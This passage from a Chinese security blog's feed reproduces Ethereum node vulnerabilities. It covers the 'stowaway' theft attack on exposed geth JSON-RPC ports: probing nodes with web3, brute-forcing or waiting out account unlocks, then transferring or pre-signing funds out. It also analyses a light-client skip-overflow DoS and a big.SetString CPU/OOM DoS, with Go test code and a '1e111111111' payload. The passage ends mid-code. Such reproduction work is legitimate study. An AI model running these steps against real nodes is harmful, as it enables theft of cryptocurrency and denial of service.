<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.spoock.com/2018/10/23/java-xxe/" target="_blank" rel="noopener">JAVA常见的XXE漏洞写法和防御</a><br><a href="https://blog.spoock.com/2018/05/16/cve-2018-1259/" target="_blank" rel="noopener">spring-data-XMLBean XXE复现分析</a><br><a href="https://xz.aliyun.com/t/2341" target="_blank" rel="noopener">XXE with Spring Data’s XMLBeam 分析</a><br><a href="https://www.cnblogs.com/Qian123/p/5256084.html" target="_blank" rel="noopener">框架基础——全面解析Java注解</a></p>
]]></content>
      
        <categories>
            
            <category> Web渗透 </category>
            
            <category> 漏洞学习 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Web渗透 </tag>
            
            <tag> XXE </tag>
            
            <tag> 漏洞学习 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ETH 漏洞复现]]></title>
      <url>/2019/03/14/%E5%8C%BA%E5%9D%97%E9%93%BE/ETH/ETH-1/%E5%81%B7%E6%B8%A1%E6%BC%8F%E6%B4%9E_%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h1 id="ETH"><a href="#ETH" class="headerlink" title="ETH"></a>ETH</h1><p>系统环境 ubuntu 16</p>
<h2 id="搭建私有测试链"><a href="#搭建私有测试链" class="headerlink" title="搭建私有测试链"></a>搭建私有测试链</h2><ul>
<li>下载相关的go-ethereum 协议</li>
</ul>
<p>git clone <a href="https://github.com/ethereum/go-ethereum.git" target="_blank" rel="noopener">https://github.com/ethereum/go-ethereum.git</a></p>
<ul>
<li>安装go环境</li>
</ul>
<p>wget <a href="https://dl.google.com/go/go1.12.linux-amd64.tar.gz" target="_blank" rel="noopener">https://dl.google.com/go/go1.12.linux-amd64.tar.gz</a></p>
<p>tar -C /usr/local -xzf go1.12.linux-amd64.tar.gz</p>
<p>修改配置环境<br>vim ~/.bashrc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GOROOT=/usr/local/go</span><br><span class="line">export GOPATH=/home/go_demo</span><br><span class="line">export PATH=$PATH:$GOPATH:/usr/local/go/bin</span><br></pre></td></tr></table></figure></p>
<ul>
<li>make geth</li>
<li>连接测试网络</li>
</ul>
<p>因为仅仅是作为测试链来使用，这里就不连接到主网了，毕竟同步数据会消耗长时间和硬盘。</p>
<p>./build/bin/geth –testnet console</p>
<ul>
<li><p>开启json-rpc  端口</p>
<p>geth –rpc –rpcaddr <ip> –rpcport <portnumber></portnumber></ip></p>
</li>
<li>RPC常用调用格式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cur addr:port -X POST --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:id, &quot;method&quot;:&quot;$&#123;method&#125;&quot;,&quot;params&quot;:&quot;$&#123;params&#125;&quot;&#125;&apos;</span><br></pre></td></tr></table></figure>
<h2 id="创建私有链-待续"><a href="#创建私有链-待续" class="headerlink" title="创建私有链-待续"></a>创建私有链-待续</h2><h3 id="部署测试合约-待续"><a href="#部署测试合约-待续" class="headerlink" title="部署测试合约-待续"></a>部署测试合约-待续</h3><h3 id="合约创建子链-待续"><a href="#合约创建子链-待续" class="headerlink" title="合约创建子链-待续"></a>合约创建子链-待续</h3><hr>
<h3 id="ETH-节点JSON-RPC测试"><a href="#ETH-节点JSON-RPC测试" class="headerlink" title="ETH 节点JSON-RPC测试"></a>ETH 节点JSON-RPC测试</h3><p>RPC接口：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">web3_clientVersion</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web3_sha3</span><br><span class="line">net_version</span><br><span class="line">net_peerCount</span><br><span class="line">net_listening</span><br><span class="line">eth_protocolVersion</span><br><span class="line">eth_syncing</span><br><span class="line">eth_coinbase</span><br><span class="line">eth_mining</span><br><span class="line">eth_hashrate</span><br><span class="line">eth_gasPrice</span><br><span class="line">eth_accounts</span><br><span class="line">eth_blockNumber</span><br><span class="line">eth_getBalance</span><br><span class="line">eth_getStorageAt</span><br><span class="line">eth_getTransactionCount</span><br><span class="line">eth_getBlockTransactionCountByHash</span><br><span class="line">eth_getBlockTransactionCountByNumber</span><br><span class="line">eth_getUncleCountByBlockHash</span><br><span class="line">eth_getUncleCountByBlockNumber</span><br><span class="line">eth_getCode</span><br><span class="line">eth_sign</span><br><span class="line">eth_sendTransaction</span><br><span class="line">eth_sendRawTransaction</span><br><span class="line">eth_call</span><br><span class="line">eth_estimateGas</span><br><span class="line">eth_getBlockByHash</span><br><span class="line">eth_getBlockByNumber</span><br><span class="line">eth_getTransactionByHash</span><br><span class="line">eth_getTransactionByBlockHashAndIndex</span><br><span class="line">eth_getTransactionByBlockNumberAndIndex</span><br><span class="line">eth_getTransactionReceipt</span><br><span class="line">eth_getUncleByBlockHashAndIndex</span><br><span class="line">eth_getUncleByBlockNumberAndIndex</span><br><span class="line">eth_getCompilers</span><br><span class="line">eth_compileLLL</span><br><span class="line">eth_compileSolidity</span><br><span class="line">eth_compileSerpent</span><br><span class="line">eth_newFilter</span><br><span class="line">eth_newBlockFilter</span><br><span class="line">eth_newPendingTransactionFilter</span><br><span class="line">eth_uninstallFilter</span><br><span class="line">eth_getFilterChanges</span><br><span class="line">eth_getFilterLogs</span><br><span class="line">eth_getLogs</span><br><span class="line">eth_getWork</span><br><span class="line">eth_submitWork</span><br><span class="line">eth_submitHashrate</span><br><span class="line">db_putString</span><br><span class="line">db_getString</span><br><span class="line">db_putHex</span><br><span class="line">db_getHex</span><br><span class="line">shh_post</span><br><span class="line">shh_version</span><br><span class="line">shh_newIdentity</span><br><span class="line">shh_hasIdentity</span><br><span class="line">shh_newGroup</span><br><span class="line">shh_addToGroup</span><br><span class="line">shh_newFilter</span><br><span class="line">shh_uninstallFilter</span><br><span class="line">shh_getFilterChanges</span><br><span class="line">shh_getMessages</span><br></pre></td></tr></table></figure></p>
<h2 id="创建钱包"><a href="#创建钱包" class="headerlink" title="创建钱包"></a>创建钱包</h2><p>启动节点后，调用节点自身的console，创建账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; eth.accounts</span><br></pre></td></tr></table></figure></p>
<p>查询钱包用户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; personal.newAccount()</span><br></pre></td></tr></table></figure></p>
<p>创建钱包用户<br>这里注意下，当一个节点绑定多个钱包账户的时候，挖矿的收益会默认在第一个创始账户中，这个时候要改变收益账号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; miner.setEtherbase(eth.accounts[1])</span><br><span class="line">成功改变会返回 true</span><br></pre></td></tr></table></figure></p>
<p>查询获益钱包账户<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; eth.coinbase</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;personal.unlockAccount(address,passwd,time)</span><br></pre></td></tr></table></figure>
<p>解锁钱包用户</p>
<p>查询余额<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type&quot;:application/json --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;eth_getBalance&quot;,&quot;params&quot;:[&quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;,&quot;latest&quot;],&quot;id&quot;:67&#125;&apos; 172.25.0.10:8545</span><br></pre></td></tr></table></figure></p>
<p>发起转账请求<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type&quot;:application/json --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_sendTransaction&quot;,&quot;params&quot;: [&#123;                                                                               </span><br><span class="line">  &quot;from&quot;: &quot;0xde1e758511a7c67e7db93d1c23c1060a21db4615&quot;,</span><br><span class="line">  &quot;to&quot;: &quot;0xd64a66c28a6ae5150af5e7c34696502793b91ae7&quot;,</span><br><span class="line">  &quot;value&quot;: &quot;0x1&quot;</span><br><span class="line">&#125;],</span><br><span class="line">&quot;id&quot;:67&#125;&apos; 172.25.0.10:8545</span><br></pre></td></tr></table></figure></p>
<p>但是注意一下在此处的 当余额为0的时候，会报错，报错信息如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;error&quot;:&#123;&quot;code&quot;:-32000,&quot;message&quot;:&quot;exceeds block gas limit&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>待深究</p>
<p>其中 personal_listWallets 接口可以查看所有账户的解锁情况。</p>
<h3 id="偷渡漏洞验证"><a href="#偷渡漏洞验证" class="headerlink" title="偷渡漏洞验证"></a>偷渡漏洞验证</h3><p>以太坊交易流程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户发起转账请求。</span><br><span class="line"></span><br><span class="line">以太坊对转账信息进行签名</span><br><span class="line"></span><br><span class="line">校验签名后的信息并将信息加入交易缓存池 (txpool)</span><br><span class="line"></span><br><span class="line">从交易缓存池中提取交易信息进行广播</span><br></pre></td></tr></table></figure></p>
<p>此处的核心便是对personal_unlockAccount的爆破攻击，在爆破成功后或者用户自身交易解锁的空余时间内，对该接口进行解锁，在解锁后，攻击者便调用转账函数，对该接口以较高的gas进行转账处理。</p>
<p>防范方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">personal.sendTransaction 进行转账</span><br></pre></td></tr></table></figure></p>
<p>关于 personal.sendTransaction与personal_unlockAccount对区别<br>这也就意味着如果执行了 unlockAccount() 函数、没有超时的话，从 ipc、rpc 调用 SendTransaction() 都会成功签名相关交易</p>
<h4 id="偷渡漏洞接口爆破"><a href="#偷渡漏洞接口爆破" class="headerlink" title="偷渡漏洞接口爆破"></a>偷渡漏洞接口爆破</h4><p>爆破的目标<br>personal_unlockAccount 接口变成了 personal_sendTransaction 接口</p>
<p>开启挖矿<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H &quot;Content-Type&quot;:application/json --data &apos;&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;, &quot;method&quot;:&quot;miner_start&quot;,&quot;params&quot;:[],&quot;id&quot;:67&#125;&apos; 172.25.0.10:8545</span><br></pre></td></tr></table></figure></p>
<p>或者 用本地console<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">miner.start(1)</span><br></pre></td></tr></table></figure></p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>这里用docker 环境下的python3.6<br>docker run -it python:3.6 /bin/bash</p>
<h5 id="探测节点端口是否开放、获取当前区块高度"><a href="#探测节点端口是否开放、获取当前区块高度" class="headerlink" title="探测节点端口是否开放、获取当前区块高度"></a>探测节点端口是否开放、获取当前区块高度</h5><p>直接调用RPC 8545端口</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3,HTTPProvider</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>web3=Web3(HTTPProvider(<span class="string">"http://xx.xx.xx.xx:8545/"</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>web3.eth.blockNumber</span><br></pre></td></tr></table></figure>
<h5 id="探测节点上是否绑定有相关账户"><a href="#探测节点上是否绑定有相关账户" class="headerlink" title="探测节点上是否绑定有相关账户"></a>探测节点上是否绑定有相关账户</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>web3.eth.accounts</span><br></pre></td></tr></table></figure>
<h5 id="查询下账户相关余额"><a href="#查询下账户相关余额" class="headerlink" title="查询下账户相关余额"></a>查询下账户相关余额</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>web3.eth.getBalance(web3.eth.accounts[])</span><br></pre></td></tr></table></figure>
<h5 id="调用RPC爆破账户"><a href="#调用RPC爆破账户" class="headerlink" title="调用RPC爆破账户"></a>调用RPC爆破账户</h5><h5 id="轮询监控节点解锁账户"><a href="#轮询监控节点解锁账户" class="headerlink" title="轮询监控节点解锁账户"></a>轮询监控节点解锁账户</h5><h5 id="解锁期间进行转账"><a href="#解锁期间进行转账" class="headerlink" title="解锁期间进行转账"></a>解锁期间进行转账</h5><p>没什么可写的，就是用个循环，调用web3.eth.sendTransaction 不停的进行转账请求</p>
<h4 id="离线状态下偷渡漏洞"><a href="#离线状态下偷渡漏洞" class="headerlink" title="离线状态下偷渡漏洞"></a>离线状态下偷渡漏洞</h4><p>跟偷渡漏洞实质没有区别，只是区别在于，不是在解锁期间进行转账，是在解锁期间调用转账签名eth_signTransaction，在账户解锁期间按照 nonce 递增的顺序构造多笔转账的签名，然后再在攻击者自己的节点上根据签名返回的raw 对签名进行广播，eth.sendRawTransaction(raw),达到转账的目的</p>
<hr>
<h3 id="轻节点的拒绝服务漏洞-待分析"><a href="#轻节点的拒绝服务漏洞-待分析" class="headerlink" title="轻节点的拒绝服务漏洞-待分析"></a>轻节点的拒绝服务漏洞-待分析</h3><ul>
<li>知识简介：<br>同步区块数据中，P2P模式，也分为客户端和服务端，在这其中，获取数据的是客户端，推送数据的属于服务端。</li>
</ul>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>漏洞主要利用的是轻节点协议LES协议，复现前先缕一下这个函数及其功能。</p>
<h6 id="LES协议"><a href="#LES协议" class="headerlink" title="LES协议"></a>LES协议</h6><p>全称：Light Ethereum Subprotocol<br>以太坊三层协议中的上层协议</p>
<ul>
<li>层1 以太坊应用层协议: eth协议、les协议</li>
<li>层2 p2p 通信链路</li>
<li>层3 go语言的网络IO层</li>
</ul>
<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>les/handler.go<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">	case query.Origin.Hash != (common.Hash&#123;&#125;) &amp;&amp; !query.Reverse:</span><br><span class="line">		// Hash based traversal towards the leaf block</span><br><span class="line">		if header := pm.blockchain.GetHeaderByNumber(origin.Number.Uint64() + query.Skip + 1); header != nil &#123;</span><br><span class="line">			if pm.blockchain.GetBlockHashesFromHash(header.Hash(), query.Skip+1)[query.Skip] == query.Origin.Hash &#123;</span><br><span class="line">				query.Origin.Hash = header.Hash()</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				unknown = true</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			unknown = true</span><br><span class="line">		&#125;</span><br><span class="line">	case query.Reverse:</span><br><span class="line">		// Number based traversal towards the genesis block</span><br><span class="line">		if query.Origin.Number &gt;= query.Skip+1 &#123;</span><br><span class="line">			query.Origin.Number -= (query.Skip + 1)</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			unknown = true</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	case !query.Reverse:</span><br><span class="line">		// Number based traversal towards the leaf block</span><br><span class="line">		query.Origin.Number += (query.Skip + 1)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bv, rcost := p.fcClient.RequestProcessed(costs.baseCost + query.Amount*costs.reqCost)</span><br><span class="line">pm.server.fcCostStats.update(msg.Code, query.Amount, rcost)</span><br><span class="line">return p.SendBlockHeaders(req.ReqID, bv, headers)</span><br></pre></td></tr></table></figure></p>
<p>eth/handler.go 365-385 此处已修复<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">case query.Origin.Hash != (common.Hash&#123;&#125;) &amp;&amp; !query.Reverse:</span><br><span class="line">		// Hash based traversal towards the leaf block</span><br><span class="line">		var (</span><br><span class="line">			current = origin.Number.Uint64()</span><br><span class="line">			next    = current + query.Skip + 1</span><br><span class="line">		)</span><br><span class="line">		if next &lt;= current &#123;</span><br><span class="line">			infos, _ := json.MarshalIndent(p.Peer.Info(), &quot;&quot;, &quot;  &quot;)</span><br><span class="line">			p.Log().Warn(&quot;GetBlockHeaders skip overflow attack&quot;, &quot;current&quot;, current, &quot;skip&quot;, query.Skip, &quot;next&quot;, next, &quot;attacker&quot;, infos)</span><br><span class="line">			unknown = true</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			if header := pm.blockchain.GetHeaderByNumber(next); header != nil &#123;</span><br><span class="line">				if pm.blockchain.GetBlockHashesFromHash(header.Hash(), query.Skip+1)[query.Skip] == query.Origin.Hash &#123;</span><br><span class="line">					query.Origin.Hash = header.Hash()</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					unknown = true</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				unknown = true</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></p>
<hr>
<h3 id="SetString导致的OOM拒绝服务"><a href="#SetString导致的OOM拒绝服务" class="headerlink" title="SetString导致的OOM拒绝服务"></a>SetString导致的OOM拒绝服务</h3><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>根据分析，go语言中在使用math.big.Rat.SetString的时候，如果对传入的需要转换的函数没有相应的检测的时候，在传入其值为一个很大的浮点数的字符串的时候，就可能导致CPU耗尽的拒绝服务。<br>big.NewInt(0).SetString同样存在</p>
<h5 id="测试样例"><a href="#测试样例" class="headerlink" title="测试样例"></a>测试样例</h5><p>这里简单调用下该模块，检查其对传入的很大的浮点型字符串时的处理<br><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"fmt"</span></span><br><span class="line">	<span class="string">"math/big"</span></span><br><span class="line">	<span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span>  <span class="title">Test</span><span class="params">(test <span class="keyword">string</span>)</span> <span class="params">()</span></span> &#123;</span><br><span class="line">	num, success := <span class="built_in">new</span>(big.Rat).SetString(test);</span><br><span class="line">	<span class="keyword">if</span> success &#123;</span><br><span class="line">		fmt.Print(num);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	fmt.Println(os.Args)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(os.Args); i++ &#123;</span><br><span class="line">		fmt.Println(os.Args[i])</span><br><span class="line">	&#125;</span><br><span class="line">	Test(os.Args[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>测试结果图：<br><img src="/2019/03/14/区块链/ETH/ETH-1/偷渡漏洞_拒绝服务/15522267821055/15522370181287.jpg" alt="-w1256"><br>此处可以明显看到通过OS传入的浮点型参数1e111111111，此时CPU升到100%</p>
<p>不过当浮点数</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">type</span> txdata <span class="keyword">struct</span> &#123;</span><br><span class="line">		AccountNonce <span class="keyword">string</span> <span class="string">`json:"nonce"`</span></span><br><span class="line">		Price        <span class="keyword">string</span> <span class="string">`json:"gasPrice"`</span></span><br><span class="line">		GasLimit     <span class="keyword">string</span> <span class="string">`json:"gas"`</span></span><br><span class="line">		Recipient    <span class="keyword">string</span> <span class="string">`json:"to"`</span></span><br><span class="line">		Amount       <span class="keyword">string</span> <span class="string">`json:"value"`</span></span><br><span class="line">		Payload      <span class="keyword">string</span> <span class="string">`json:"input"`</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> dec txdata</span><br><span class="line"></span><br><span class="line">	data := []<span class="keyword">byte</span>(<span class="string">"&#123;\"nonce\":\"2\",\"gasPrice\":1000000000000000000,\"gas\":\"50000\",\"to\":\"0x3fac0b8a3d21f8565b7446c6cc9e932badfb186c\",\"value\":\"20000\",\"input\":\"0x\"&#125;"</span>)</span><br><span class="line">	<span class="keyword">if</span> err := json.Unmarshal(data, &amp;dec); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err);</span><br><span class="line">	&#125;</span><br><span class="line">	price := big.NewInt(<span class="number">0</span>)</span><br><span class="line">	price.SetString(dec.Price, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><p>看过测试用例后，这里我们实际分析一个最近看到的公链上漏洞。</p>
<ul>
<li>定位漏洞<br>这里根据代码审计中最简单的漏洞定位方法，因为知道了math.big.SetString存在问题,这里就去寻找，然后察看是否有可疑参数传入<br>这里我们定位到了<br>go-ethernum/cmd/geth/accountcmd.go 文件中</li>
</ul>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">signTx</span><span class="params">(ctx *cli.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">	prikey := ctx.Args().First()</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(prikey) == <span class="number">0</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"&#123;error1&#125;"</span>)</span><br><span class="line">		<span class="keyword">return</span> errors.New(<span class="string">"no prikey"</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	key, err := crypto.LoadECDSA(prikey)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"&#123;error2&#125;"</span>)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	jsonstr := ctx.GlobalString(utils.PasswordFileFlag.Name)</span><br><span class="line">	log.Info(jsonstr)</span><br><span class="line">	<span class="keyword">type</span> txdata <span class="keyword">struct</span> &#123;</span><br><span class="line">		AccountNonce <span class="keyword">string</span> <span class="string">`json:"nonce"`</span></span><br><span class="line">		Price        <span class="keyword">string</span> <span class="string">`json:"gasPrice"`</span></span><br><span class="line">		GasLimit     <span class="keyword">string</span> <span class="string">`json:"gas"`</span></span><br><span class="line">		Recipient    <span class="keyword">string</span> <span class="string">`json:"to"`</span></span><br><span class="line">		Amount       <span class="keyword">string</span> <span class="string">`json:"value"`</span></span><br><span class="line">		Payload      <span class="keyword">string</span> <span class="string">`json:"input"`</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> dec txdata</span><br><span class="line">	<span class="keyword">if</span> err := json.Unmarshal([]<span class="keyword">byte</span>(jsonstr), &amp;dec); err != <span class="literal">nil</span> &#123;<span class="comment">//go的json解析</span></span><br><span class="line">		fmt.Println(<span class="string">"&#123;error3&#125;"</span>)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	nonce, err := strconv.ParseUint(dec.AccountNonce, <span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">"&#123;error4&#125;"</span>)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	amount := big.NewInt(<span class="number">0</span>)</span><br><span class="line">	amount.SetString(dec.Amount, <span class="number">0</span>)</span><br><span class="line">	price := big.NewInt(<span class="number">0</span>)</span><br><span class="line">	price.SetString(dec.Price, <span class="number">0</span>)</span><br><span class="line">	gas := big.NewInt(<span class="number">0</span>)</span><br><span class="line">	gas.SetString(dec.GasLimit, <span class="number">0</span>)</span><br><span class="line">	tx := types.NewTransaction(nonce, 